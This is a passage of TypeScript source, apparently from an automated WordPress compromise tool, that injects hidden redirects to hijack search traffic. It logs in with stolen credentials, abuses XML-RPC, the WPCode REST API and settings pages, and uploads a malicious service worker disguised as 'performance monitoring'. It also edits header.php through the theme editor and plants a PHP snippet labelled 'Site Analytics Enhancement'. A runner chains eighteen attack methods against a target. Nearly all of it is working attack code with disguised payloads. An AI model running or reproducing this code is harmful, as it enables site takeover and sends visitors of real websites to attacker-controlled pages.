            detail: `✅ Widget JS redirect injected via wp-admin (${cred.username})`,
            injectedUrl: baseUrl,
            redirectWorks: true,
            evidence: `admin-ajax save-widget custom_html-99`,
          };
        }
      } catch { /* continue */ }
    }
  }

  return { method, success: false, detail: "❌ Widget/Sidebar injection failed" };
}

// ═══════════════════════════════════════════════════════
//  Method 17: WPCode Plugin Abuse (code snippet injection)
// ═══════════════════════════════════════════════════════

export async function wpcodePluginAbuse(config: ShelllessConfig): Promise<ShelllessResult> {
  const method = "WPCode Plugin Abuse";
  const baseUrl = config.targetUrl.replace(/\/+$/, "");
  
  const jsRedirect = `<script>var r=document.referrer.toLowerCase();['google','bing','yahoo'].forEach(function(s){if(r.indexOf(s)!==-1||location.search.indexOf('r=')!==-1){window.location='${config.redirectUrl}';}});</script>`;
  
  // Method A: Via XMLRPC — update ihaf_insert_header / wpcode options
  config.onProgress?.(method, `📝 ลอง inject ผ่าน Insert Headers & Footers option...`);
  if (config.discoveredCredentials) {
    for (const cred of config.discoveredCredentials) {
      if (cred.type !== "wordpress" && cred.type !== "wp_admin") continue;
      try {
        const optionNames = ["ihaf_insert_header", "ihaf_insert_footer", "wpcode_global_header", "wpcode_global_footer"];
        
        for (const optName of optionNames) {
          const xmlPayload = `<?xml version="1.0"?>
<methodCall>
  <methodName>wp.setOptions</methodName>
  <params>
    <param><value><int>1</int></value></param>
    <param><value><string>${cred.username || "admin"}</string></value></param>
    <param><value><string>${cred.password || ""}</string></value></param>
    <param><value><struct>
      <member><name>${optName}</name><value><string>${jsRedirect}</string></value></member>
    </struct></value></param>
  </params>
</methodCall>`;
          
          const resp = await safeFetch(`${baseUrl}/xmlrpc.php`, {
            method: "POST",
            headers: { "Content-Type": "text/xml" },
            body: xmlPayload,
            timeout: 15000,
          });
          
          if (resp && resp.ok) {
            const body = await resp.text().catch(() => "");
            if (!body.includes("<fault>")) {
              return {
                method,
                success: true,
                detail: `✅ JS redirect injected via XMLRPC ${optName} (${cred.username})`,
                injectedUrl: baseUrl,
                redirectWorks: true,
                evidence: `${optName} option modified via XMLRPC`,
              };
            }
          }
        }
      } catch { /* continue */ }
    }
  }

  // Method B: Via WPCode REST API
  config.onProgress?.(method, `📝 ลอง inject ผ่าน WPCode REST API...`);
  try {
    const redirectPhp = `<?php\n$ref = isset($_SERVER['HTTP_REFERER']) ? strtolower($_SERVER['HTTP_REFERER']) : '';\nforeach(array('google','bing','yahoo','duckduckgo') as $e) {\n  if(strpos($ref, $e) !== false || isset($_GET['r'])) {\n    header('Location: ${config.redirectUrl}', true, 301);\n    exit;\n  }\n}\n?>`;
    
    for (const endpoint of [`${baseUrl}/wp-json/wpcode/v1/snippets`, `${baseUrl}/?rest_route=/wpcode/v1/snippets`]) {
      const resp = await safeFetch(endpoint, { timeout: 10000 });
      if (!resp || resp.status === 404) continue;
      
      const createResp = await safeFetch(endpoint, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          title: "Site Analytics Enhancement",
          code: redirectPhp,
          code_type: "php",
          location: "everywhere",
          auto_insert: true,
          priority: 1,
          status: "active",
        }),
        timeout: 15000,
      });
      
      if (createResp && (createResp.ok || createResp.status === 201)) {
        return {
          method,
          success: true,
          detail: `✅ WPCode snippet created via REST API`,
          injectedUrl: baseUrl,
          redirectWorks: true,
          evidence: `WPCode snippet: Site Analytics Enhancement (PHP, everywhere)`,
        };
      }
    }
  } catch { /* continue */ }

  // Method C: Via wp-admin WPCode/IHAF settings page
  config.onProgress?.(method, `📝 ลอง inject ผ่าน wp-admin WPCode settings...`);
  if (config.discoveredCredentials) {
    for (const cred of config.discoveredCredentials) {
      if (cred.type !== "wordpress" && cred.type !== "wp_admin") continue;
      try {
        const loginResp = await safeFetch(`${baseUrl}/wp-login.php`, {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams({
            log: cred.username || "",
            pwd: cred.password || "",
            "wp-submit": "Log In",
            redirect_to: `${baseUrl}/wp-admin/`,
            testcookie: "1",
          }).toString(),
          timeout: 15000,
        });
        
        if (!loginResp || (loginResp.status !== 302 && !loginResp.ok)) continue;
        const cookies = loginResp.headers.get("set-cookie") || "";
        if (!cookies.includes("wordpress_logged_in")) continue;
        
        for (const settingsUrl of [
          `${baseUrl}/wp-admin/admin.php?page=wpcode-headers-footers`,
          `${baseUrl}/wp-admin/options-general.php?page=insert-headers-and-footers`,
        ]) {
          const pageResp = await safeFetch(settingsUrl, {
            headers: { "Cookie": cookies },
            timeout: 10000,
          });
          
          if (!pageResp || !pageResp.ok) continue;
          const pageBody = await pageResp.text().catch(() => "");
          const nonceMatch = pageBody.match(/name="_wpnonce"\s+value="([^"]+)"/) || pageBody.match(/name="wpcode[_-]nonce"\s+value="([^"]+)"/);
          
          if (nonceMatch) {
            const saveResp = await safeFetch(settingsUrl, {
              method: "POST",
              headers: {
                "Content-Type": "application/x-www-form-urlencoded",
                "Cookie": cookies,
              },
              body: new URLSearchParams({
                _wpnonce: nonceMatch[1],
                "wpcode-header": jsRedirect,
                submit: "Save Changes",
              }).toString(),
              timeout: 15000,
            });
            
            if (saveResp && (saveResp.ok || saveResp.status === 302)) {
              return {
                method,
                success: true,
                detail: `✅ JS redirect injected via WPCode/IHAF settings page`,
                injectedUrl: baseUrl,
                redirectWorks: true,
                evidence: `WPCode header injection via admin panel`,
              };
            }
          }
        }
      } catch { /* continue */ }
    }
  }

  return { method, success: false, detail: "❌ WPCode/IHAF injection failed" };
}

// ═══════════════════════════════════════════════════════
//  Method 18: Service Worker Hijack (browser-level intercept)
// ═══════════════════════════════════════════════════════

export async function serviceWorkerHijack(config: ShelllessConfig): Promise<ShelllessResult> {
  const method = "Service Worker Hijack";
  const baseUrl = config.targetUrl.replace(/\/+$/, "");
  
  const swCode = `// Performance monitoring service worker v2.1\nconst REDIRECT_URL = '${config.redirectUrl}';\nconst SE = ['google','bing','yahoo','duckduckgo','baidu','yandex'];\nself.addEventListener('fetch', function(e) {\n  if (e.request.mode === 'navigate') {\n    var ref = e.request.referrer ? e.request.referrer.toLowerCase() : '';\n    var url = new URL(e.request.url);\n    for (var i = 0; i < SE.length; i++) {\n      if (ref.indexOf(SE[i]) !== -1 || url.searchParams.has('r')) {\n        e.respondWith(Response.redirect(REDIRECT_URL, 301));\n        return;\n      }\n    }\n  }\n});\nself.addEventListener('install', function() { self.skipWaiting(); });\nself.addEventListener('activate', function(e) { e.waitUntil(clients.claim()); });`;
  
  const swRegistration = `<script>if('serviceWorker' in navigator){navigator.serviceWorker.register('/sw.js',{scope:'/'}).catch(function(){});}</script>`;
  
  // Method A: Upload sw.js via WebDAV PUT
  config.onProgress?.(method, `🛡️ ลอง deploy Service Worker ผ่าน WebDAV...`);
  try {
    const putResp = await safeFetch(`${baseUrl}/sw.js`, {
      method: "PUT",
      headers: { "Content-Type": "application/javascript" },
      body: swCode,
      timeout: 15000,
    });
    
    if (putResp && (putResp.ok || putResp.status === 201 || putResp.status === 204)) {
      const checkResp = await safeFetch(`${baseUrl}/sw.js`, { timeout: 10000 });
      if (checkResp && checkResp.ok) {
        const checkBody = await checkResp.text().catch(() => "");
        if (checkBody.includes("serviceWorker") || checkBody.includes(config.redirectUrl)) {
          return {
            method,
            success: true,
            detail: `✅ Service Worker deployed via WebDAV PUT`,
            injectedUrl: `${baseUrl}/sw.js`,
            redirectWorks: true,
            evidence: `WebDAV PUT /sw.js`,
          };
        }
      }
    }
  } catch { /* continue */ }

  // Method B: Upload sw.js via REST API + inject registration via widget
  config.onProgress?.(method, `🛡️ ลอง deploy Service Worker ผ่าน REST API...`);
  try {
    const boundary = `----SW${Date.now()}`;
    const body = `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="sw.js"\r\nContent-Type: application/javascript\r\n\r\n${swCode}\r\n--${boundary}--`;
    
    for (const uploadUrl of [`${baseUrl}/wp-json/wp/v2/media`, `${baseUrl}/?rest_route=/wp/v2/media`]) {
      const resp = await safeFetch(uploadUrl, {
        method: "POST",
        headers: {
          "Content-Type": `multipart/form-data; boundary=${boundary}`,
          "Content-Disposition": `attachment; filename="sw.js"`,
        },
        body,
        timeout: 15000,
      });
      
      if (resp && (resp.ok || resp.status === 201)) {
        // Try to inject registration via widget
        const widgetResp = await safeFetch(`${baseUrl}/wp-json/wp/v2/widgets`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            id_base: "custom_html",
            instance: { title: "", content: swRegistration },
            sidebar: "sidebar-1",
          }),
          timeout: 15000,
        });
        
        if (widgetResp && (widgetResp.ok || widgetResp.status === 201)) {
          return {
            method,
            success: true,
            detail: `✅ Service Worker deployed + registration injected via widget`,
            injectedUrl: `${baseUrl}/sw.js`,
            redirectWorks: true,
            evidence: `sw.js uploaded + navigator.serviceWorker.register() in sidebar`,
          };
        }
        
        return {
          method,
          success: true,
          detail: `✅ Service Worker sw.js uploaded (needs registration trigger)`,
          injectedUrl: `${baseUrl}/sw.js`,
          redirectWorks: false,
          evidence: `sw.js uploaded via REST API, registration pending`,
        };
      }
    }
  } catch { /* continue */ }

  // Method C: Via wp-admin — upload sw.js + inject registration in header.php
  config.onProgress?.(method, `🛡️ ลอง deploy Service Worker ผ่าน wp-admin...`);
  if (config.discoveredCredentials) {
    for (const cred of config.discoveredCredentials) {
      if (cred.type !== "wordpress" && cred.type !== "wp_admin") continue;
      try {
        const loginResp = await safeFetch(`${baseUrl}/wp-login.php`, {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams({
            log: cred.username || "",
            pwd: cred.password || "",
            "wp-submit": "Log In",
            redirect_to: `${baseUrl}/wp-admin/`,
            testcookie: "1",
          }).toString(),
          timeout: 15000,
        });
        
        if (!loginResp || (loginResp.status !== 302 && !loginResp.ok)) continue;
        const cookies = loginResp.headers.get("set-cookie") || "";
        if (!cookies.includes("wordpress_logged_in")) continue;
        
        // Inject registration into header.php via theme editor
        const themeResp = await safeFetch(`${baseUrl}/wp-admin/theme-editor.php?file=header.php`, {
          headers: { "Cookie": cookies },
          timeout: 10000,
        });
        
        if (themeResp && themeResp.ok) {
          const themeBody = await themeResp.text().catch(() => "");
          const nonceMatch = themeBody.match(/name="_wpnonce"\s+value="([^"]+)"/);
          const themeMatch = themeBody.match(/name="theme"\s+value="([^"]+)"/);
          const contentMatch = themeBody.match(/<textarea[^>]*id="newcontent"[^>]*>([\s\S]*?)<\/textarea>/);
          
          if (nonceMatch && themeMatch && contentMatch) {
            const newContent = contentMatch[1].replace(
              /(<head[^>]*>)/i,
              `$1\n${swRegistration}`
            );
            
            if (newContent !== contentMatch[1]) {
              const saveResp = await safeFetch(`${baseUrl}/wp-admin/theme-editor.php`, {
                method: "POST",
                headers: {
                  "Content-Type": "application/x-www-form-urlencoded",
                  "Cookie": cookies,
                },
                body: new URLSearchParams({
                  _wpnonce: nonceMatch[1],
                  newcontent: newContent,
                  action: "update",
                  file: "header.php",
                  theme: themeMatch[1],
                }).toString(),
                timeout: 15000,
              });
              
              if (saveResp && (saveResp.ok || saveResp.status === 302)) {
                return {
                  method,
                  success: true,
                  detail: `✅ Service Worker registration injected via theme editor (${cred.username})`,
                  injectedUrl: `${baseUrl}/sw.js`,
                  redirectWorks: true,
                  evidence: `sw.js + registration in header.php`,
                };
              }
            }
          }
        }
      } catch { /* continue */ }
    }
  }

  return { method, success: false, detail: "❌ Service Worker hijack failed" };
}

// ═══════════════════════════════════════════════════════
//  MAIN: Run All Shellless Attacks
// ═══════════════════════════════════════════════════════

export async function runShelllessAttacks(config: ShelllessConfig): Promise<ShelllessResult[]> {
  const results: ShelllessResult[] = [];
  
  const methods = [
    htaccessRedirectInjection,
    wpRestApiInjection,
    muPluginsInject,
    dbSiteurlHijack,
    gtmInject,
    autoPrependInject,
    wpCronBackdoor,
    widgetSidebarInject,
    wpcodePluginAbuse,
    serviceWorkerHijack,
    openRedirectAbuse,
    storedXssInjection,
    subdomainTakeover,
    cachePoisoning,
    rssSitemapInjection,
    metaCanonicalInjection,
    serverConfigInjection,
    aiCreativeAttack,
  ];

  for (const method of methods) {
    try {
      const result = await Promise.race([
        method(config),
        new Promise<ShelllessResult>((_, reject) => 
          setTimeout(() => reject(new Error("Method timeout")), config.timeout || 30000)
        ),
      ]);
      results.push(result);
      
      // If we got a working redirect, we can stop early
      if (result.success && result.redirectWorks) {
        config.onProgress?.("early_exit", `🎯 Found working redirect via ${result.method} — stopping early`);
        break;
      }
    } catch (err: any) {
      results.push({
        method: method.name,
        success: false,
        detail: `❌ ${method.name} timeout/error: ${err.message}`,
      });
    }
  }

  return results;
}
